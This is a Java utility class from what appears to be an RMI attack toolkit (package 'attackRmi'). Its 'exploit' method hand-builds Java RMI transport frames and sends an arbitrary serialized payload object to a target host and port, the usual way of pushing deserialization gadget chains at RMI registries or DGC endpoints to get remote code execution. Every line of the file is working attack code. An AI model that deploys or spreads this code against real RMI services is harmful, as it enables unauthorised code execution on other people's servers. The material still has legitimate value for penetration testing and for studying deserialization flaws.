package com.wu.attackRmi.utils;


import sun.rmi.server.MarshalInputStream;
import sun.rmi.transport.TransportConstants;

import javax.net.SocketFactory;
import java.io.*;
import java.lang.reflect.Proxy;
import java.net.Socket;
import java.rmi.server.ObjID;
import java.rmi.server.UID;

public class Stub {

    public static Proxy exploit ( String hostname, int port, Object payloadObject, ObjID objid, int opnum, Long hash) throws Exception {
        Socket s = null;
        DataOutputStream dos = null;
        Proxy proxy = null;
        try {
            s = SocketFactory.getDefault().createSocket(hostname, port);
            s.setKeepAlive(true);
            s.setTcpNoDelay(true);

            OutputStream os = s.getOutputStream();
            dos = new DataOutputStream(os);

            dos.writeInt(TransportConstants.Magic);
            dos.writeShort(TransportConstants.Version);
            dos.writeByte(TransportConstants.SingleOpProtocol);

            dos.write(TransportConstants.Call);

            final ObjectOutputStream objOut = new MarshalOutputStream(dos);


            objid.write(objOut); //Objid

            objOut.writeInt(opnum); // opnum
            objOut.writeLong(hash); // hash

            objOut.writeObject(payloadObject);

            os.flush();
            //
            if (opnum == 2){
                InputStream ins = s.getInputStream();
                byte[] buf = new byte[1];
                ins.read(buf);
                ObjectInputStream oins = new WuMarshalInputStream(ins);
                oins.readByte();//return type
                UID.read(oins);//ack dgc id

                proxy = (Proxy) oins.readObject();
            }

            return proxy;
        } finally {
            if (dos != null) {
                dos.close();
            }
            if (s != null) {
                s.close();
            }
        }
    }
}
